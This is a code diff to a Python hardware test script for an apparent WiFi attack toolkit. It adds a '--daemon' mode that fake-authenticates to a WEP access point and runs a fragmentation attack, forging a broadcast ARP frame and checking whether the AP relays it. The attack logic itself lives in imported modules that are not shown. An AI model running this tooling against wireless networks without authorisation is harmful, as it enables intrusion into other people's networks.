@@ -40,6 +40,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))
 
 from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
+from wifit3.engine.attacks.wep.fragmentation import WepFragmentation
 from wifit3.engine.attacks.wep.wep_crypto import (
     arp_request_plaintext,
     build_fragments,
@@ -285,6 +286,41 @@ async def main_async(args) -> int:
                  "out of range or filtering — retry closer.")
         ok(f"Associated as {_mac(fake_auth.source_mac)}")
 
+        # --daemon: run the REAL WepFragmentation daemon (oracle + immediate
+        # handoff) instead of the raw inject+dump path — a hardware smoke-test
+        # of the shipping code before the campaign/UI exists.
+        if args.daemon:
+            step(f"Run WepFragmentation daemon (up to {args.inject_secs:.0f}s)")
+            relayed = {}
+            daemon = WepFragmentation(
+                iface, target, iface.wep_store, fake_auth.source_mac,
+                on_forged_arp=lambda fr: relayed.setdefault("frame", fr),
+                can_inject=lambda: fake_auth.state == "associated",
+                log_callback=info,
+                sender_ip=bytes(int(x) for x in args.sender_ip.split(".")),
+                target_ip=bytes(int(x) for x in args.target_ip.split(".")),
+            )
+            daemon.start()
+            end = time.time() + args.inject_secs
+            while (time.time() < end and "frame" not in relayed
+                   and daemon.is_active):
+                await asyncio.sleep(0.2)
+            rounds = daemon._round
+            daemon.stop()
+            fake_auth.stop()
+            step("Results")
+            if "frame" in relayed:
+                fr = relayed["frame"]
+                ok(f"Daemon SUCCESS after {rounds} rounds — AP relayed our "
+                   f"reassembled ARP (len={len(fr)}, SA={_mac(fr[16:22])}, "
+                   "handed to on_forged_arp).")
+                ok("fragmentation.py oracle + immediate handoff verified on HW.")
+            else:
+                fail(f"Daemon ran {rounds} rounds, no relay in "
+                     f"{args.inject_secs:.0f}s. Confirm a broadcast ARP was "
+                     "available to seed (ping the gateway, or --provoke).")
+            return 0
+
         # Build the fragmented broadcast ARP (known plaintext).
         payload = arp_request_plaintext(
             sender_mac=fake_auth.source_mac,
@@ -376,6 +412,9 @@ def main() -> int:
     p.add_argument("--inject-secs", type=float, default=10.0)
     p.add_argument("--round-gap", type=float, default=0.2, help="RX window between rounds")
     p.add_argument("--out", default="wifit3-wep-frag.pcap", help="pcap output path")
+    p.add_argument("--daemon", action="store_true",
+                   help="run the real WepFragmentation daemon (oracle + handoff) "
+                        "instead of raw inject+dump — hardware smoke-test")
     p.add_argument("--debug", action="store_true", help="verbose USB/driver logging")
     args = p.parse_args()
 
